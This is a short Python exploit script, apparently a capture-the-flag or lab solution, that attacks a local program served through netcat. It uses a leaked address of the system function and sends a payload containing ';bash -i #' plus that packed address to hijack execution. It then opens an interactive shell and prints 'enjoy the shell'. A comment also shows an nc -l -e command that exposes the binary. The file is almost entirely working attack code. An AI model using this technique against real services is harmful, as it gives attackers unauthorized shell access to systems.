#!/usr/bin/env python3
import telnetlib
import struct
import logging

HOST="localhost"
#while true; do nc -l -p 1111 -e /tmp/vuln; done

old_write=telnetlib.Telnet.write
def write(self, str_: bytes):
    try:
        print("w: ",str_.decode("utf-8"))
    except UnicodeDecodeError:
        print("w: ",str_)
    old_write(self,str_)
telnetlib.Telnet.write=write
old_read_until=telnetlib.Telnet.read_until
def read_until(self, *args, **kwargs):
    s=old_read_until(self,*args, **kwargs)
    try:
        print("r: ", s.decode("utf-8"))
    except UnicodeDecodeError:
        print("r: ",s)
    return s
telnetlib.Telnet.read_until=read_until




tn = telnetlib.Telnet(HOST,1111)
tn.read_until(match=b": ")
tn.write(b"4\n")
help_txt=tn.read_until(match=b": ")
system=help_txt.decode("utf-8").split("- ")[1].split("\n")[0]
system=int(system,16)
tn.write(b"1\n")
tn.read_until(match=b": ")
system=struct.pack("I",system)
tn.write(b";bash -i #\x00\x00\x00\x00"+system+b"\n")
print("enjoy the shell")
tn.interact()

